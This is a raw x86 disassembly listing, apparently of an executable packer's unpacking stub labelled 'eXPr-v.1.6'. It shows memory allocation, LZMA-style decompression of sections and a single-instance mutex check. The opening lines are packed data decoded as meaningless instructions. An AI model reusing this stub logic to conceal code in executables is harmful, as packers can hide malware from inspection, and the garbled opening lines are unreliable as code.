  40718c:	fc                   	cld
  40718d:	e7 53                	out    %eax,$0x53
  40718f:	97                   	xchg   %eax,%edi
  407190:	e3 d8                	jecxz  0x40716a
  407192:	3e 89 89 79 05 e2 75 	mov    %ecx,%ds:0x75e20579(%ecx)
  407199:	43                   	inc    %ebx
  40719a:	30 1b                	xor    %bl,(%ebx)
  40719c:	0d 13 81 92 65       	or     $0x65928113,%eax
  4071a1:	04 c4                	add    $0xc4,%al
  4071a3:	19 fa                	sbb    %edi,%edx
  4071a5:	4c                   	dec    %esp
  4071a6:	a8 a7                	test   $0xa7,%al
  4071a8:	fa                   	cli
  4071a9:	c9                   	leave
  4071aa:	9c                   	pushf
  4071ab:	75 87                	jne    0x407134
  4071ad:	8e 48 b9             	mov    -0x47(%eax),%cs
  4071b0:	27                   	daa
  4071b1:	71 1a                	jno    0x4071cd
  4071b3:	e6 f3                	out    %al,$0xf3
  4071b5:	04 f7                	add    $0xf7,%al
  4071b7:	04 8c                	add    $0x8c,%al
  4071b9:	9d                   	popf
  4071ba:	8b 58 c4             	mov    -0x3c(%eax),%ebx
  4071bd:	72 6d                	jb     0x40722c
  4071bf:	ec                   	in     (%dx),%al
  4071c0:	7f d9                	jg     0x40719b
  4071c2:	a0 65 ff c4 1a       	mov    0x1ac4ff65,%al
  4071c7:	63 f6                	arpl   %esi,%esi
  4071c9:	7c 5a                	jl     0x407225
  4071cb:	8b 6f ff             	mov    -0x1(%edi),%ebp
  4071ce:	c0 9e 8d cd 82 32 f4 	rcrb   $0xf4,0x3282cd8d(%esi)
  4071d5:	94                   	xchg   %eax,%esp
  4071d6:	5e                   	pop    %esi
  4071d7:	4e                   	dec    %esi
  4071d8:	b4 12                	mov    $0x12,%ah
  4071da:	a0 41 be 65 be       	mov    0xbe65be41,%al
  4071df:	48                   	dec    %eax
  4071e0:	eb bc                	jmp    0x40719e
  4071e2:	09 08                	or     %ecx,(%eax)
  4071e4:	38 29                	cmp    %ch,(%ecx)
  4071e6:	e3 16                	jecxz  0x4071fe
  4071e8:	94                   	xchg   %eax,%esp
  4071e9:	01 9f 3c 62 61 41    	add    %ebx,0x4161623c(%edi)
  4071ef:	be f5 de eb 6a       	mov    $0x6aebdef5,%esi
  4071f4:	ac                   	lods   %ds:(%esi),%al
  4071f5:	b0 21                	mov    $0x21,%al
  4071f7:	68 5c fa 27 06       	push   $0x627fa5c
  4071fc:	d8 31                	fdivs  (%ecx)
  4071fe:	27                   	daa
  4071ff:	0c 30                	or     $0x30,%al
  407201:	a1 c2 bf 44 f4       	mov    0xf444bfc2,%eax
  407206:	81 3f a7 05 00 3b    	cmpl   $0x3b0005a7,(%edi)
  40720c:	68 84 07 50 f2       	push   $0xf2500784
  407211:	eb 44                	jmp    0x407257
  407213:	14 96                	adc    $0x96,%al
  407215:	63 1d f5 10 77 a8    	arpl   %ebx,0xa87710f5
  40721b:	66 ef                	out    %ax,(%dx)
  40721d:	98                   	cwtl
  40721e:	58                   	pop    %eax
  40721f:	d0 29                	shrb   $1,(%ecx)
  407221:	9f                   	lahf
  407222:	24 7b                	and    $0x7b,%al
  407224:	8d 45 47             	lea    0x47(%ebp),%eax
  407227:	89 2e                	mov    %ebp,(%esi)
  407229:	57                   	push   %edi
  40722a:	b5 8e                	mov    $0x8e,%ch
  40722c:	15 f9 09 b6 d2       	adc    $0xd2b609f9,%eax
  407231:	20 03                	and    %al,(%ebx)
  407233:	01 aa c9 d0 a9 d9    	add    %ebp,-0x26562f37(%edx)
  407239:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40723a:	dd 04 8b             	fldl   (%ebx,%ecx,4)
  40723d:	34 c0                	xor    $0xc0,%al
  40723f:	e4 a4                	in     $0xa4,%al
  407241:	aa                   	stos   %al,%es:(%edi)
  407242:	37                   	aaa
  407243:	6c                   	insb   (%dx),%es:(%edi)
  407244:	10 d5                	adc    %dl,%ch
  407246:	7f 70                	jg     0x4072b8
  407248:	af                   	scas   %es:(%edi),%eax
  407249:	44                   	inc    %esp
  40724a:	0f 91 1f             	setno  (%edi)
  40724d:	4a                   	dec    %edx
  40724e:	05 f0 fa 25 07       	add    $0x725faf0,%eax
  407253:	bc db 05 43 46       	mov    $0x464305db,%esp
  407258:	7e 83                	jle    0x4071dd
  40725a:	4b                   	dec    %ebx
  40725b:	ff                   	ljmp   (bad)
  40725c:	e8 57 35 84 a5       	call   0xa5c4a7b8
  407261:	58                   	pop    %eax
  407262:	70 66                	jo     0x4072ca
  407264:	38 0a                	cmp    %cl,(%edx)
  407266:	39 34 61             	cmp    %esi,(%ecx,%eiz,2)
  407269:	da 11                	ficoml (%ecx)
  40726b:	06                   	push   %es
  40726c:	4c                   	dec    %esp
  40726d:	e8 96 a5 36 e8       	call   0xe8771808
  407272:	9d                   	popf
  407273:	f2 53                	repnz push %ebx
  407275:	2a b5 2e dc 2d c2    	sub    -0x3dd223d2(%ebp),%dh
  40727b:	9a 2b 8f 3e b7 8e f0 	lcall  $0xf08e,$0xb73e8f2b
  407282:	5f                   	pop    %edi
  407283:	87 73 ff             	xchg   %esi,-0x1(%ebx)
  407286:	c7                   	(bad)
  407287:	5c                   	pop    %esp
  407288:	f0 aa                	lock stos %al,%es:(%edi)
  40728a:	55                   	push   %ebp
  40728b:	8b ec                	mov    %esp,%ebp
  40728d:	8b 45 08             	mov    0x8(%ebp),%eax
  407290:	8a 08                	mov    (%eax),%cl
  407292:	83 ec 14             	sub    $0x14,%esp
  407295:	80 f9 e1             	cmp    $0xe1,%cl
  407298:	72 05                	jb     0x40729f
  40729a:	33 c0                	xor    %eax,%eax
  40729c:	40                   	inc    %eax
  40729d:	c9                   	leave
  40729e:	c3                   	ret
  40729f:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4072a3:	80 f9 2d             	cmp    $0x2d,%cl
  4072a6:	72 14                	jb     0x4072bc
  4072a8:	32 e4                	xor    %ah,%ah
  4072aa:	8a c1                	mov    %cl,%al
  4072ac:	b2 2d                	mov    $0x2d,%dl
  4072ae:	f6 f2                	div    %dl
  4072b0:	0f b6 c0             	movzbl %al,%eax
  4072b3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4072b6:	80 c1 d3             	add    $0xd3,%cl
  4072b9:	48                   	dec    %eax
  4072ba:	75 fa                	jne    0x4072b6
  4072bc:	53                   	push   %ebx
  4072bd:	33 db                	xor    %ebx,%ebx
  4072bf:	80 f9 09             	cmp    $0x9,%cl
  4072c2:	72 13                	jb     0x4072d7
  4072c4:	32 e4                	xor    %ah,%ah
  4072c6:	8a c1                	mov    %cl,%al
  4072c8:	b2 09                	mov    $0x9,%dl
  4072ca:	f6 f2                	div    %dl
  4072cc:	0f b6 c0             	movzbl %al,%eax
  4072cf:	8b d8                	mov    %eax,%ebx
  4072d1:	80 c1 f7             	add    $0xf7,%cl
  4072d4:	48                   	dec    %eax
  4072d5:	75 fa                	jne    0x4072d1
  4072d7:	56                   	push   %esi
  4072d8:	57                   	push   %edi
  4072d9:	0f b6 f1             	movzbl %cl,%esi
  4072dc:	8d 0c 1e             	lea    (%esi,%ebx,1),%ecx
  4072df:	bf 00 03 00 00       	mov    $0x300,%edi
  4072e4:	d3 e7                	shl    %cl,%edi
  4072e6:	6a 04                	push   $0x4
  4072e8:	68 00 10 00 00       	push   $0x1000
  4072ed:	8d bc 3f 6c 0e 00 00 	lea    0xe6c(%edi,%edi,1),%edi
  4072f4:	57                   	push   %edi
  4072f5:	6a 00                	push   $0x0
  4072f7:	ff 15 28 70 40 00    	call   *0x407028
  4072fd:	85 c0                	test   %eax,%eax
  4072ff:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407302:	75 03                	jne    0x407307
  407304:	40                   	inc    %eax
  407305:	eb 5d                	jmp    0x407364
  407307:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  40730a:	51                   	push   %ecx
  40730b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40730e:	6a ff                	push   $0xffffffff
  407310:	ff 75 10             	push   0x10(%ebp)
  407313:	83 c1 fb             	add    $0xfffffffb,%ecx
  407316:	51                   	push   %ecx
  407317:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40731a:	83 c1 05             	add    $0x5,%ecx
  40731d:	51                   	push   %ecx
  40731e:	ff 75 fc             	push   -0x4(%ebp)
  407321:	53                   	push   %ebx
  407322:	56                   	push   %esi
  407323:	57                   	push   %edi
  407324:	50                   	push   %eax
  407325:	e8 95 0c 00 00       	call   0x407fbf
  40732a:	8b 75 f8             	mov    -0x8(%ebp),%esi
  40732d:	83 c4 28             	add    $0x28,%esp
  407330:	68 00 80 00 00       	push   $0x8000
  407335:	33 db                	xor    %ebx,%ebx
  407337:	53                   	push   %ebx
  407338:	ff 75 f4             	push   -0xc(%ebp)
  40733b:	8b f8                	mov    %eax,%edi
  40733d:	ff 15 24 70 40 00    	call   *0x407024
  407343:	8d 45 f0             	lea    -0x10(%ebp),%eax
  407346:	50                   	push   %eax
  407347:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40734a:	50                   	push   %eax
  40734b:	53                   	push   %ebx
  40734c:	56                   	push   %esi
  40734d:	ff 75 10             	push   0x10(%ebp)
  407350:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  407353:	c7 45 f0 fb ff ff ff 	movl   $0xfffffffb,-0x10(%ebp)
  40735a:	e8 57 08 00 00       	call   0x407bb6
  40735f:	83 c4 14             	add    $0x14,%esp
  407362:	8b c7                	mov    %edi,%eax
  407364:	5f                   	pop    %edi
  407365:	5e                   	pop    %esi
  407366:	5b                   	pop    %ebx
  407367:	c9                   	leave
  407368:	c3                   	ret
  407369:	55                   	push   %ebp
  40736a:	8b ec                	mov    %esp,%ebp
  40736c:	8b 45 10             	mov    0x10(%ebp),%eax
  40736f:	56                   	push   %esi
  407370:	57                   	push   %edi
  407371:	89 45 10             	mov    %eax,0x10(%ebp)
  407374:	8b 75 0c             	mov    0xc(%ebp),%esi
  407377:	8b 7d 08             	mov    0x8(%ebp),%edi
  40737a:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40737d:	fc                   	cld
  40737e:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  407380:	8b 45 08             	mov    0x8(%ebp),%eax
  407383:	5f                   	pop    %edi
  407384:	5e                   	pop    %esi
  407385:	5d                   	pop    %ebp
  407386:	c3                   	ret
  407387:	8b 0d 04 70 40 00    	mov    0x407004,%ecx
  40738d:	b8 42 74 40 00       	mov    $0x407442,%eax
  407392:	2b 41 74             	sub    0x74(%ecx),%eax
  407395:	c3                   	ret
  407396:	55                   	push   %ebp
  407397:	8d 6c 24 88          	lea    -0x78(%esp),%ebp
  40739b:	81 ec 8c 00 00 00    	sub    $0x8c,%esp
  4073a1:	53                   	push   %ebx
  4073a2:	56                   	push   %esi
  4073a3:	57                   	push   %edi
  4073a4:	6a 06                	push   $0x6
  4073a6:	59                   	pop    %ecx
  4073a7:	be 58 70 40 00       	mov    $0x407058,%esi
  4073ac:	8d 7d 50             	lea    0x50(%ebp),%edi
  4073af:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4073b1:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
  4073b3:	8d 45 50             	lea    0x50(%ebp),%eax
  4073b6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4073b7:	8d 50 01             	lea    0x1(%eax),%edx
  4073ba:	8a 08                	mov    (%eax),%cl
  4073bc:	40                   	inc    %eax
  4073bd:	84 c9                	test   %cl,%cl
  4073bf:	75 f9                	jne    0x4073ba
  4073c1:	2b c2                	sub    %edx,%eax
  4073c3:	8b d0                	mov    %eax,%edx
  4073c5:	a1 04 70 40 00       	mov    0x407004,%eax
  4073ca:	83 c0 34             	add    $0x34,%eax
  4073cd:	8d 70 01             	lea    0x1(%eax),%esi
  4073d0:	8a 08                	mov    (%eax),%cl
  4073d2:	40                   	inc    %eax
  4073d3:	84 c9                	test   %cl,%cl
  4073d5:	75 f9                	jne    0x4073d0
  4073d7:	2b c6                	sub    %esi,%eax
  4073d9:	8b d8                	mov    %eax,%ebx
  4073db:	8d 45 50             	lea    0x50(%ebp),%eax
  4073de:	89 45 74             	mov    %eax,0x74(%ebp)
  4073e1:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4073e4:	89 45 6c             	mov    %eax,0x6c(%ebp)
  4073e7:	89 55 70             	mov    %edx,0x70(%ebp)
  4073ea:	8b 75 74             	mov    0x74(%ebp),%esi
  4073ed:	8b 7d 6c             	mov    0x6c(%ebp),%edi
  4073f0:	8b 4d 70             	mov    0x70(%ebp),%ecx
  4073f3:	fc                   	cld
  4073f4:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4073f6:	a1 04 70 40 00       	mov    0x407004,%eax
  4073fb:	83 c0 34             	add    $0x34,%eax
  4073fe:	53                   	push   %ebx
  4073ff:	50                   	push   %eax
  407400:	8d 44 15 ec          	lea    -0x14(%ebp,%edx,1),%eax
  407404:	50                   	push   %eax
  407405:	e8 5f ff ff ff       	call   0x407369
  40740a:	83 c4 0c             	add    $0xc,%esp
  40740d:	8d 45 ec             	lea    -0x14(%ebp),%eax
  407410:	50                   	push   %eax
  407411:	6a 00                	push   $0x0
  407413:	03 da                	add    %edx,%ebx
  407415:	6a 00                	push   $0x0
  407417:	c6 44 1d ec 00       	movb   $0x0,-0x14(%ebp,%ebx,1)
  40741c:	ff 15 30 70 40 00    	call   *0x407030
  407422:	85 c0                	test   %eax,%eax
  407424:	5f                   	pop    %edi
  407425:	5e                   	pop    %esi
  407426:	5b                   	pop    %ebx
  407427:	74 12                	je     0x40743b
  407429:	ff 15 2c 70 40 00    	call   *0x40702c
  40742f:	3d b7 00 00 00       	cmp    $0xb7,%eax
  407434:	75 05                	jne    0x40743b
  407436:	33 c0                	xor    %eax,%eax
  407438:	40                   	inc    %eax
  407439:	eb 02                	jmp    0x40743d
  40743b:	33 c0                	xor    %eax,%eax
  40743d:	83 c5 78             	add    $0x78,%ebp
  407440:	c9                   	leave
  407441:	c3                   	ret
  407442:	55                   	push   %ebp
  407443:	8b ec                	mov    %esp,%ebp
  407445:	81 ec 84 02 00 00    	sub    $0x284,%esp
  40744b:	53                   	push   %ebx
  40744c:	56                   	push   %esi
  40744d:	57                   	push   %edi
  40744e:	83 a5 a8 fd ff ff 00 	andl   $0x0,-0x258(%ebp)
  407455:	f3 eb 0c             	repz jmp 0x407464
  407458:	65 58                	gs pop %eax
  40745a:	50                   	push   %eax
  40745b:	72 2d                	jb     0x40748a
  40745d:	76 2e                	jbe    0x40748d
  40745f:	31 2e                	xor    %ebp,(%esi)
  407461:	36 2e 00 a1 00 70 40 	ss add %ah,%cs:0x407000(%ecx)
  407468:	00 
  407469:	05 00 70 40 00       	add    $0x407000,%eax
  40746e:	a3 04 70 40 00       	mov    %eax,0x407004
  407473:	a1 04 70 40 00       	mov    0x407004,%eax
  407478:	83 78 70 00          	cmpl   $0x0,0x70(%eax)
  40747c:	75 14                	jne    0x407492
  40747e:	6a 10                	push   $0x10
  407480:	68 f0 70 40 00       	push   $0x4070f0
  407485:	68 78 70 40 00       	push   $0x407078
  40748a:	6a 00                	push   $0x0
  40748c:	ff 15 50 70 40 00    	call   *0x407050
  407492:	e8 f0 fe ff ff       	call   0x407387
  407497:	a3 08 70 40 00       	mov    %eax,0x407008
  40749c:	68 04 01 00 00       	push   $0x104
  4074a1:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
  4074a7:	50                   	push   %eax
  4074a8:	ff 35 14 70 40 00    	push   0x407014
  4074ae:	ff 15 48 70 40 00    	call   *0x407048
  4074b4:	8d 84 05 d7 fd ff ff 	lea    -0x229(%ebp,%eax,1),%eax
  4074bb:	89 85 ac fd ff ff    	mov    %eax,-0x254(%ebp)
  4074c1:	8b 85 ac fd ff ff    	mov    -0x254(%ebp),%eax
  4074c7:	0f be 00             	movsbl (%eax),%eax
  4074ca:	83 f8 5c             	cmp    $0x5c,%eax
  4074cd:	74 0f                	je     0x4074de
  4074cf:	8b 85 ac fd ff ff    	mov    -0x254(%ebp),%eax
  4074d5:	48                   	dec    %eax
  4074d6:	89 85 ac fd ff ff    	mov    %eax,-0x254(%ebp)
  4074dc:	eb e3                	jmp    0x4074c1
  4074de:	8b 85 ac fd ff ff    	mov    -0x254(%ebp),%eax
  4074e4:	40                   	inc    %eax
  4074e5:	89 85 ac fd ff ff    	mov    %eax,-0x254(%ebp)
  4074eb:	8b 85 ac fd ff ff    	mov    -0x254(%ebp),%eax
  4074f1:	8d 8d d8 fd ff ff    	lea    -0x228(%ebp),%ecx
  4074f7:	2b c1                	sub    %ecx,%eax
  4074f9:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4074fc:	ff 75 f4             	push   -0xc(%ebp)
  4074ff:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
  407505:	50                   	push   %eax
  407506:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  40750c:	50                   	push   %eax
  40750d:	e8 57 fe ff ff       	call   0x407369
  407512:	83 c4 0c             	add    $0xc,%esp
  407515:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407518:	c6 84 05 e9 fe ff ff 	movb   $0x0,-0x117(%ebp,%eax,1)
  40751f:	00 
  407520:	83 a5 c4 fd ff ff 00 	andl   $0x0,-0x23c(%ebp)
  407527:	a1 04 70 40 00       	mov    0x407004,%eax
  40752c:	8b 40 04             	mov    0x4(%eax),%eax
  40752f:	25 00 00 00 04       	and    $0x4000000,%eax
  407534:	75 0f                	jne    0x407545
  407536:	a1 04 70 40 00       	mov    0x407004,%eax
  40753b:	8b 40 04             	mov    0x4(%eax),%eax
  40753e:	25 00 00 00 02       	and    $0x2000000,%eax
  407543:	74 2d                	je     0x407572
  407545:	e8 4c fe ff ff       	call   0x407396
  40754a:	89 85 c4 fd ff ff    	mov    %eax,-0x23c(%ebp)
  407550:	a1 04 70 40 00       	mov    0x407004,%eax
  407555:	8b 40 04             	mov    0x4(%eax),%eax
  407558:	25 00 00 00 04       	and    $0x4000000,%eax
  40755d:	74 13                	je     0x407572
  40755f:	83 bd c4 fd ff ff 00 	cmpl   $0x0,-0x23c(%ebp)
  407566:	74 0a                	je     0x407572
  407568:	e9 40 06 00 00       	jmp    0x407bad
  40756d:	e9 3b 06 00 00       	jmp    0x407bad
  407572:	a1 08 70 40 00       	mov    0x407008,%eax
  407577:	89 85 d0 fd ff ff    	mov    %eax,-0x230(%ebp)
  40757d:	8b 85 d0 fd ff ff    	mov    -0x230(%ebp),%eax
  407583:	8b 0d 08 70 40 00    	mov    0x407008,%ecx
  407589:	03 48 3c             	add    0x3c(%eax),%ecx
  40758c:	89 8d b0 fd ff ff    	mov    %ecx,-0x250(%ebp)
  407592:	a1 04 70 40 00       	mov    0x407004,%eax
  407597:	83 b8 98 00 00 00 00 	cmpl   $0x0,0x98(%eax)
  40759e:	0f 84 8d 01 00 00    	je     0x407731
  4075a4:	6a 04                	push   $0x4
  4075a6:	68 00 10 00 00       	push   $0x1000
  4075ab:	a1 04 70 40 00       	mov    0x407004,%eax
  4075b0:	ff 70 5c             	push   0x5c(%eax)
  4075b3:	6a 00                	push   $0x0
  4075b5:	ff 15 28 70 40 00    	call   *0x407028
  4075bb:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4075be:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4075c1:	89 85 bc fd ff ff    	mov    %eax,-0x244(%ebp)
  4075c7:	83 bd bc fd ff ff 00 	cmpl   $0x0,-0x244(%ebp)
  4075ce:	75 0a                	jne    0x4075da
  4075d0:	e9 d8 05 00 00       	jmp    0x407bad
  4075d5:	e9 d3 05 00 00       	jmp    0x407bad
  4075da:	a1 04 70 40 00       	mov    0x407004,%eax
  4075df:	8b 40 60             	mov    0x60(%eax),%eax
  4075e2:	89 85 cc fd ff ff    	mov    %eax,-0x234(%ebp)
  4075e8:	a1 04 70 40 00       	mov    0x407004,%eax
  4075ed:	8b 0d 08 70 40 00    	mov    0x407008,%ecx
  4075f3:	03 48 68             	add    0x68(%eax),%ecx
  4075f6:	a1 04 70 40 00       	mov    0x407004,%eax
  4075fb:	8b b5 b0 fd ff ff    	mov    -0x250(%ebp),%esi
  407601:	8b 80 ac 00 00 00    	mov    0xac(%eax),%eax
  407607:	33 d2                	xor    %edx,%edx
  407609:	f7 76 3c             	divl   0x3c(%esi)
  40760c:	03 ca                	add    %edx,%ecx
  40760e:	89 8d e4 fe ff ff    	mov    %ecx,-0x11c(%ebp)
  407614:	ff b5 bc fd ff ff    	push   -0x244(%ebp)
  40761a:	a1 04 70 40 00       	mov    0x407004,%eax
  40761f:	ff 70 5c             	push   0x5c(%eax)
  407622:	ff b5 e4 fe ff ff    	push   -0x11c(%ebp)
  407628:	e8 5d fc ff ff       	call   0x40728a
  40762d:	83 c4 0c             	add    $0xc,%esp
  407630:	eb 0d                	jmp    0x40763f
  407632:	8b 85 a8 fd ff ff    	mov    -0x258(%ebp),%eax
  407638:	40                   	inc    %eax
  407639:	89 85 a8 fd ff ff    	mov    %eax,-0x258(%ebp)
  40763f:	a1 04 70 40 00       	mov    0x407004,%eax
  407644:	0f b7 80 a4 00 00 00 	movzwl 0xa4(%eax),%eax
  40764b:	39 85 a8 fd ff ff    	cmp    %eax,-0x258(%ebp)
  407651:	0f 8d c5 00 00 00    	jge    0x40771c
  407657:	83 bd c4 fd ff ff 00 	cmpl   $0x0,-0x23c(%ebp)
  40765e:	74 38                	je     0x407698
  407660:	a1 04 70 40 00       	mov    0x407004,%eax
  407665:	8b 40 04             	mov    0x4(%eax),%eax
  407668:	25 00 00 00 02       	and    $0x2000000,%eax
  40766d:	74 29                	je     0x407698
  40766f:	8b 85 a8 fd ff ff    	mov    -0x258(%ebp),%eax
  407675:	6b c0 18             	imul   $0x18,%eax,%eax
  407678:	8b 0d 04 70 40 00    	mov    0x407004,%ecx
  40767e:	8b 84 01 bc 00 00 00 	mov    0xbc(%ecx,%eax,1),%eax
  407685:	25 00 00 00 10       	and    $0x10000000,%eax
  40768a:	74 0c                	je     0x407698
  40768c:	c7 85 90 fd ff ff 01 	movl   $0x1,-0x270(%ebp)
  407693:	00 00 00 
  407696:	eb 07                	jmp    0x40769f
  407698:	83 a5 90 fd ff ff 00 	andl   $0x0,-0x270(%ebp)
  40769f:	8b 85 90 fd ff ff    	mov    -0x270(%ebp),%eax
  4076a5:	89 85 a0 fd ff ff    	mov    %eax,-0x260(%ebp)
  4076ab:	83 bd a0 fd ff ff 00 	cmpl   $0x0,-0x260(%ebp)
  4076b2:	75 41                	jne    0x4076f5
  4076b4:	8b 85 a8 fd ff ff    	mov    -0x258(%ebp),%eax
  4076ba:	6b c0 18             	imul   $0x18,%eax,%eax
  4076bd:	8b 0d 04 70 40 00    	mov    0x407004,%ecx
  4076c3:	ff b4 01 b0 00 00 00 	push   0xb0(%ecx,%eax,1)
  4076ca:	ff b5 bc fd ff ff    	push   -0x244(%ebp)
  4076d0:	8b 85 a8 fd ff ff    	mov    -0x258(%ebp),%eax
  4076d6:	6b c0 18             	imul   $0x18,%eax,%eax
  4076d9:	8b 0d 04 70 40 00    	mov    0x407004,%ecx
  4076df:	8b 15 08 70 40 00    	mov    0x407008,%edx
  4076e5:	03 94 01 b4 00 00 00 	add    0xb4(%ecx,%eax,1),%edx
  4076ec:	52                   	push   %edx
  4076ed:	e8 77 fc ff ff       	call   0x407369
  4076f2:	83 c4 0c             	add    $0xc,%esp
  4076f5:	8b 85 a8 fd ff ff    	mov    -0x258(%ebp),%eax
  4076fb:	6b c0 18             	imul   $0x18,%eax,%eax
  4076fe:	8b 0d 04 70 40 00    	mov    0x407004,%ecx
  407704:	8b 95 bc fd ff ff    	mov    -0x244(%ebp),%edx
  40770a:	03 94 01 b0 00 00 00 	add    0xb0(%ecx,%eax,1),%edx
  407711:	89 95 bc fd ff ff    	mov    %edx,-0x244(%ebp)
  407717:	e9 16 ff ff ff       	jmp    0x407632
  40771c:	68 00 80 00 00       	push   $0x8000
  407721:	6a 00                	push   $0x0
  407723:	ff 75 fc             	push   -0x4(%ebp)
  407726:	ff 15 24 70 40 00    	call   *0x407024
  40772c:	e9 82 01 00 00       	jmp    0x4078b3
  407731:	a1 04 70 40 00       	mov    0x407004,%eax
  407736:	8b 0d 08 70 40 00    	mov    0x407008,%ecx
  40773c:	03 48 68             	add    0x68(%eax),%ecx
  40773f:	a1 04 70 40 00       	mov    0x407004,%eax
  407744:	2b 48 64             	sub    0x64(%eax),%ecx
  407747:	a1 04 70 40 00       	mov    0x407004,%eax
  40774c:	8b b5 b0 fd ff ff    	mov    -0x250(%ebp),%esi
  407752:	8b 80 ac 00 00 00    	mov    0xac(%eax),%eax
  407758:	33 d2                	xor    %edx,%edx
  40775a:	f7 76 3c             	divl   0x3c(%esi)
  40775d:	03 ca                	add    %edx,%ecx
  40775f:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  407762:	83 a5 a8 fd ff ff 00 	andl   $0x0,-0x258(%ebp)
  407769:	eb 0d                	jmp    0x407778
  40776b:	8b 85 a8 fd ff ff    	mov    -0x258(%ebp),%eax
  407771:	40                   	inc    %eax
  407772:	89 85 a8 fd ff ff    	mov    %eax,-0x258(%ebp)
  407778:	a1 04 70 40 00       	mov    0x407004,%eax
  40777d:	0f b7 80 a4 00 00 00 	movzwl 0xa4(%eax),%eax
  407784:	39 85 a8 fd ff ff    	cmp    %eax,-0x258(%ebp)
  40778a:	0f 8d 23 01 00 00    	jge    0x4078b3
  407790:	8b 85 a8 fd ff ff    	mov    -0x258(%ebp),%eax
  407796:	6b c0 18             	imul   $0x18,%eax,%eax
  407799:	8b 0d 04 70 40 00    	mov    0x407004,%ecx
  40779f:	83 bc 01 a8 00 00 00 	cmpl   $0x0,0xa8(%ecx,%eax,1)
  4077a6:	00 
  4077a7:	0f 84 01 01 00 00    	je     0x4078ae
  4077ad:	8b 85 a8 fd ff ff    	mov    -0x258(%ebp),%eax
  4077b3:	6b c0 18             	imul   $0x18,%eax,%eax
  4077b6:	8b 0d 04 70 40 00    	mov    0x407004,%ecx
  4077bc:	83 bc 01 b0 00 00 00 	cmpl   $0x0,0xb0(%ecx,%eax,1)
  4077c3:	00 
  4077c4:	0f 86 e4 00 00 00    	jbe    0x4078ae
  4077ca:	8b 85 a8 fd ff ff    	mov    -0x258(%ebp),%eax
  4077d0:	6b c0 18             	imul   $0x18,%eax,%eax
  4077d3:	8b 0d 04 70 40 00    	mov    0x407004,%ecx
  4077d9:	8b 15 08 70 40 00    	mov    0x407008,%edx
  4077df:	03 94 01 b4 00 00 00 	add    0xb4(%ecx,%eax,1),%edx
  4077e6:	89 95 bc fd ff ff    	mov    %edx,-0x244(%ebp)
  4077ec:	8b 85 a8 fd ff ff    	mov    -0x258(%ebp),%eax
  4077f2:	6b c0 18             	imul   $0x18,%eax,%eax
  4077f5:	8b 0d 04 70 40 00    	mov    0x407004,%ecx
  4077fb:	8b 84 01 b0 00 00 00 	mov    0xb0(%ecx,%eax,1),%eax
  407802:	89 85 cc fd ff ff    	mov    %eax,-0x234(%ebp)
  407808:	8b 85 a8 fd ff ff    	mov    -0x258(%ebp),%eax
  40780e:	6b c0 18             	imul   $0x18,%eax,%eax
  407811:	8b 0d 04 70 40 00    	mov    0x407004,%ecx
  407817:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40781a:	03 94 01 ac 00 00 00 	add    0xac(%ecx,%eax,1),%edx
  407821:	89 95 e4 fe ff ff    	mov    %edx,-0x11c(%ebp)
  407827:	83 bd c4 fd ff ff 00 	cmpl   $0x0,-0x23c(%ebp)
  40782e:	74 38                	je     0x407868
  407830:	a1 04 70 40 00       	mov    0x407004,%eax
  407835:	8b 40 04             	mov    0x4(%eax),%eax
  407838:	25 00 00 00 02       	and    $0x2000000,%eax
  40783d:	74 29                	je     0x407868
  40783f:	8b 85 a8 fd ff ff    	mov    -0x258(%ebp),%eax
  407845:	6b c0 18             	imul   $0x18,%eax,%eax
  407848:	8b 0d 04 70 40 00    	mov    0x407004,%ecx
  40784e:	8b 84 01 bc 00 00 00 	mov    0xbc(%ecx,%eax,1),%eax
  407855:	25 00 00 00 10       	and    $0x10000000,%eax
  40785a:	74 0c                	je     0x407868
  40785c:	c7 85 8c fd ff ff 01 	movl   $0x1,-0x274(%ebp)
  407863:	00 00 00 
  407866:	eb 07                	jmp    0x40786f
  407868:	83 a5 8c fd ff ff 00 	andl   $0x0,-0x274(%ebp)
  40786f:	8b 85 8c fd ff ff    	mov    -0x274(%ebp),%eax
  407875:	89 85 9c fd ff ff    	mov    %eax,-0x264(%ebp)
  40787b:	83 bd 9c fd ff ff 00 	cmpl   $0x0,-0x264(%ebp)
  407882:	75 2a                	jne    0x4078ae
  407884:	ff b5 bc fd ff ff    	push   -0x244(%ebp)
  40788a:	8b 85 a8 fd ff ff    	mov    -0x258(%ebp),%eax
  407890:	6b c0 18             	imul   $0x18,%eax,%eax
  407893:	8b 0d 04 70 40 00    	mov    0x407004,%ecx
  407899:	ff b4 01 b0 00 00 00 	push   0xb0(%ecx,%eax,1)
  4078a0:	ff b5 e4 fe ff ff    	push   -0x11c(%ebp)
  4078a6:	e8 df f9 ff ff       	call   0x40728a
  4078ab:	83 c4 0c             	add    $0xc,%esp
  4078ae:	e9 b8 fe ff ff       	jmp    0x40776b
  4078b3:	a1 04 70 40 00       	mov    0x407004,%eax
  4078b8:	8b 0d 08 70 40 00    	mov    0x407008,%ecx
  4078be:	03 88 84 00 00 00    	add    0x84(%eax),%ecx
  4078c4:	89 8d b4 fd ff ff    	mov    %ecx,-0x24c(%ebp)
  4078ca:	8b 85 b4 fd ff ff    	mov    -0x24c(%ebp),%eax
